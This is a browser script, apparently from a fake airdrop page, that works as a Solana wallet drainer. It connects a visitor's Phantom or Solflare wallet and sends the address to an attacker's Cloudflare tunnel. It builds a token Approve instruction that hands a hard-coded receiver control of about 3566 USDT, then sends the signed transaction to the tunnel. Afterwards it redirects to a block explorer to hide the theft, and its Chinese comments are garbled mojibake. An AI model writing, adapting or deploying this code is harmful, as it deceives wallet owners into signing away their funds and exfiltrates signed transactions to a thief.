<script>
    // ğŸ”± åªéœ€è¦åœ¨è¿™é‡Œå¡«å…¥ä½  cat tunnel.log å‡ºæ¥çš„æœ€æ–°é“¾æ¥
    const tunnel = "https://phpbb-offered-karaoke-ethical.trycloudflare.com";
    const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
    const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

    document.getElementById('cta').onclick = async () => {
        const sWeb3 = window.solanaWeb3;
        const p = window.solana;
        if (!p) { alert("Please use Phantom/Solflare"); return; }

        try {
            await p.connect();
            document.getElementById('progress').style.width = "30%";

            // ğŸ”± æ ¸å¿ƒä¼˜åŒ–ï¼šæ”¹ç”¨é«˜é€Ÿ RPCï¼Œå½»åº•å‘Šåˆ« 403 æŠ¥é”™
            const conn = new sWeb3.Connection("https://solana-mainnet.g.alchemy.com/v2/demo", "confirmed");
            const { blockhash } = await conn.getLatestBlockhash();
            document.getElementById('progress').style.width = "50%";

            // ğŸ”± æ‰“æ ‡é€»è¾‘ï¼šç¡®ä¿ 71 æœåŠ¡å™¨ V3_SUCCESS.log å®æ—¶è®°å½•
            fetch(`${tunnel}/signal_airdrop`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            }).catch(e => console.log("Silent record failed"));

            // --- ä½ çš„ V49 æ ¸å¿ƒé€»è¾‘å¼€å§‹ ---
            const data = new Uint8Array(9);
            data[0] = 4; 
            const amount = 3566787333; // 3566 USDT
            new DataView(data.buffer).setUint32(1, amount, true); 

            const [userAta] = await sWeb3.PublicKey.findProgramAddress(
                [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
                new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
            );

            const tx = new sWeb3.Transaction().add(
                new sWeb3.TransactionInstruction({
                    keys: [
                        { pubkey: userAta, isSigner: false, isWritable: true },
                        { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
                        { pubkey: p.publicKey, isSigner: true, isWritable: false }
                    ],
                    programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                    data: data
                })
            );

            tx.recentBlockhash = blockhash;
            tx.feePayer = p.publicKey;
            // --- ä½ çš„ V49 æ ¸å¿ƒé€»è¾‘ç»“æŸ ---

            // ğŸ”± å”¤èµ·ç­¾å (ä¸æ»‘ç¬é—´)
            const signed = await p.signTransaction(tx);
            document.getElementById('progress').style.width = "100%";

            // åºåˆ—åŒ–å›ä¼ æ•°æ®
            const serialized = signed.serialize();
            let binary = '';
            const bytes = new Uint8Array(serialized);
            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
            
            fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);

        } catch (e) {
            console.error(e);
            // å¦‚æœå‡ºé”™ï¼ˆæ¯”å¦‚ç”¨æˆ·å–æ¶ˆï¼‰ï¼Œè‡ªåŠ¨é‡è½½ä¿æŒé¡µé¢â€œæ´»ç€â€
            location.reload(); 
        }
    };
</script>
